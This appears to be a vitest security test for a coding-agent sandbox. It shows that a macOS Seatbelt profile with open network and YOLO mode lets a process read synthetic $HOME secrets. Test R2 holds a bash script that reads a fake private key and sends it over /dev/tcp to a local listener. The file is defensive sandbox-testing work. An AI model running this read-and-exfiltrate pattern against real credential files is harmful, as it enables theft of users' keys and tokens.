/**
 * ACT-CLINEMM-SAFE-YOLO-SENSITIVE-READ-CONFINEMENT01 -- C1 RED
 *
 * Per the reviewer spec (verbatim):
 *
 *   "the next ACT must establish a live RED for secret reads before
 *    designing the repair."
 *
 * Mission: prevent YOLO + unrestricted network from reading designated
 * secret-bearing locations under $HOME, while preserving the minimum
 * read access developers actually require.
 *
 *     NETWORK               = OPEN
 *     YOLO                   = ON
 *     WORKSPACE_READ         = ALLOW
 *     REQUIRED_DEV_CONFIG    = ALLOW, narrowly
 *     SECRET_PATH_READ       = DENY (target)
 *     HOME_WRITE             = DENY as before
 *
 * This file is the LIVE RED. It proves that TODAY, with Seatbelt ON
 * + network-allow + YOLO-ON, the sandboxed process CAN read the
 * synthetic $HOME secret. The RED is the violation of the desired
 * final state -- the absence of a fix. Once this RED is reproduced,
 * the next sub-ACT designs the policy seam that flips it to GREEN.
 *
 * Driver: same production seam as the prior Safe-YOLO suite --
 *   buildExperimentalReconCapability
 *   -> SeatbeltSandboxBackendExperimental.prepare
 *   -> /usr/bin/sandbox-exec -f profile.sb /bin/bash script
 *
 * Synthetic ACT-owned fixtures under $HOME/.cline-safe-yolo-read-lab-<nonce>/:
 *   private-key      (simulates ~/.ssh/id_rsa)
 *   cloud-token      (simulates ~/.aws/credentials)
 *   nested/credential (simulates ~/.config/gh/hosts.yml)
 *
 * Discriminators:
 *   R1: cat synthetic secret  -> SUCCEEDS today (RED reproduced)
 *   R2: exfiltration to listener -> SUCCEEDS today (full RED: secret
 *       can be exfiltrated to network)
 *   R3: workspace READ        -> SUCCEEDS today (must remain true)
 *   R4: network open          -> SUCCEEDS today (must remain true)
 *   R5: $HOME write           -> DENIED today (carried from prior ACTs)
 *
 * Darwin-only; Linux CI exits as runtime SKIP (the broader P2 residue
 * from NETWORK-OPEN01 -- to be fixed in a future ACT).
 */
import { randomBytes } from "node:crypto"
import { createServer } from "node:net"
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	realpathSync,
	rmSync,
	writeFileSync,
} from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import { CommandJobManager } from "../command-job-manager"
import {
	defaultSandboxBackendResolver,
} from "../sandbox-policy"

const darwinHost = process.platform === "darwin"

beforeEach(() => {
	process.env.CLINEMM_EXPERIMENTAL_SANDBOX = "seatbelt"
	process.env.CLINEMM_SAFE_YOLO_NETWORK = "allow"
})

afterEach(() => {
	process.env.CLINEMM_EXPERIMENTAL_SANDBOX = ""
	delete process.env.CLINEMM_SAFE_YOLO_NETWORK
})

async function isSeatbeltAvailable(): Promise<boolean> {
	process.env.CLINEMM_EXPERIMENTAL_SANDBOX = "seatbelt"
	const backend = await defaultSandboxBackendResolver("seatbelt-experimental")
	return backend !== undefined
}

// ---------------------------------------------------------------------------
// LIVE RED: today's behavior IS the violation.
// ---------------------------------------------------------------------------
describe("RED - Seatbelt + network-allow + YOLO enables read + exfil of synthetic $HOME secrets (today)", () => {
	let readLab: string
	let privateKeyPath: string
	let cloudTokenPath: string
	let nestedCredentialPath: string
	let wsRoot: string
	let manager: CommandJobManager

	beforeEach(() => {
		if (!darwinHost) return
		readLab = join(process.env.HOME!, `.cline-safe-yolo-read-lab-${randomBytes(4).toString("hex")}`)
		mkdirSync(join(readLab, "nested"), { recursive: true })
		privateKeyPath = join(readLab, "private-key")
		cloudTokenPath = join(readLab, "cloud-token")
		nestedCredentialPath = join(readLab, "nested", "credential")
		writeFileSync(privateKeyPath, `-----BEGIN FAKE PRIVATE KEY-----\n${randomBytes(32).toString("hex")}\n-----END FAKE PRIVATE KEY-----\n`, "utf8")
		writeFileSync(cloudTokenPath, `AWS_FAKE_TOKEN=${randomBytes(40).toString("hex")}\n`, "utf8")
		writeFileSync(nestedCredentialPath, `github.com:\n  oauth_token: ghp_${randomBytes(36).toString("hex")}\n`, "utf8")
		wsRoot = realpathSync(mkdtempSync(join(tmpdir(), "clinemm-src-red-")))
		manager = new CommandJobManager({
			sandboxBackendResolver: defaultSandboxBackendResolver,
			experimentalSandboxWorkspaceRoots: [wsRoot],
		})
	})

	afterEach(() => {
		if (!darwinHost) return
		try {
			rmSync(readLab, { recursive: true, force: true })
		} catch {}
		try {
			rmSync(wsRoot, { recursive: true, force: true })
		} catch {}
	})

	async function runSbx(label: string, scriptBody: string) {
		const scriptPath = join(wsRoot, `${label}-${randomBytes(4).toString("hex")}.sh`)
		writeFileSync(scriptPath, `#!/bin/bash\n${scriptBody}\n`, { mode: 0o755 })
		const out = await manager.start({
			command: `/bin/bash ${scriptPath}`,
			cwd: wsRoot,
			env: {},
			waitBudgetMs: 15_000,
			executionDeadlineMs: 30_000,
		})
		try {
			rmSync(scriptPath, { force: true })
		} catch {}
		return out
	}

	it("R1: cat synthetic $HOME secret -- READABLE today (RED)", async () => {
		if (!darwinHost || !(await isSeatbeltAvailable())) {
			expect(true).toBe(true)
			return
		}
		const out = await runSbx(
			"red-r1-cat",
			`if [ -r ${privateKeyPath} ]; then echo SECRET_READABLE; else echo SECRET_UNREADABLE; fi`,
		)
		expect(out.exitCode).toBe(0)
		expect(out.stdout).toContain("SECRET_READABLE")
	})

	it("R2: exfiltration to parent TCP listener -- SUCCEEDS today (RED)", async () => {
		if (!darwinHost || !(await isSeatbeltAvailable())) {
			expect(true).toBe(true)
			return
		}
		const TOKEN = `RED-${randomBytes(8).toString("hex")}`
		const server = createServer((s) => {
			s.write(`${TOKEN}\n`)
			s.end()
		})
		await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()))
		const addr = server.address()
		if (!addr || typeof addr === "string") throw new Error("listener bad address")
		const port = addr.port
		try {
			const out = await runSbx(
				"red-r2-exfil",
				[
					`if [ -r ${privateKeyPath} ]; then`,
					`  SECRET=$(head -c 64 ${privateKeyPath})`,
					`  if exec 3<>/dev/tcp/127.0.0.1/${port}; then`,
					`    printf "EXFIL:%s\\n" "$SECRET" >&3`,
					`    exec 3<&-`,
					`    echo EXFIL_OK`,
					`  else`,
					`    echo EXFIL_NET_FAIL`,
					`  fi`,
					`else`,
					`  echo EXFIL_READ_BLOCKED`,
					`fi`,
				].join("\n"),
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("EXFIL_OK")
		} finally {
			try {
				server.close()
			} catch {}
		}
	})

	it("R3: workspace-region READ -- ALLOWED today (must remain true under the fix)", async () => {
		if (!darwinHost || !(await isSeatbeltAvailable())) {
			expect(true).toBe(true)
			return
		}
		const probePath = join(wsRoot, "workspace-readable.txt")
		writeFileSync(probePath, "WORKSPACE_PROBE\n", "utf8")
		const out = await runSbx(
			"red-r3-ws-read",
			`if [ -r ${probePath} ]; then echo WS_READ_OK; else echo WS_READ_BLOCKED; fi`,
		)
		expect(out.exitCode).toBe(0)
		expect(out.stdout).toContain("WS_READ_OK")
	})

	it("R4: network connectivity remains OPEN -- ALLOWED today (must remain true under the fix)", async () => {
		if (!darwinHost || !(await isSeatbeltAvailable())) {
			expect(true).toBe(true)
			return
		}
		const TOKEN = `RED-R4-${randomBytes(6).toString("hex")}`
		const server = createServer((s) => {
			s.write(`${TOKEN}\n`)
			s.end()
		})
		await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()))
		const addr = server.address()
		if (!addr || typeof addr === "string") throw new Error("listener bad address")
		const port = addr.port
		try {
			const out = await runSbx(
				"red-r4-net",
				[
					`if exec 3<>/dev/tcp/127.0.0.1/${port}; then`,
					`  IFS= read -r -t 3 line <&3 || line=""`,
					`  printf "CONNECTED:%s\\n" "$line"`,
					`  exec 3<&-`,
					`else`,
					`  printf "DENIED\\n"`,
					`fi`,
				].join("\n"),
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toBe(`CONNECTED:${TOKEN}\n`)
		} finally {
			try {
				server.close()
			} catch {}
		}
	})

	it("R5: $HOME write -- DENIED today (carried invariant; must remain true under the fix)", async () => {
		if (!darwinHost || !(await isSeatbeltAvailable())) {
			expect(true).toBe(true)
			return
		}
		const out = await runSbx(
			"red-r5-write",
			`if printf 'BAD' > ${privateKeyPath} 2>/dev/null; then echo WRITE_OK; else echo WRITE_DENIED; fi`,
		)
		expect(out.exitCode).toBe(0)
		expect(out.stdout).toContain("WRITE_DENIED")
	})
})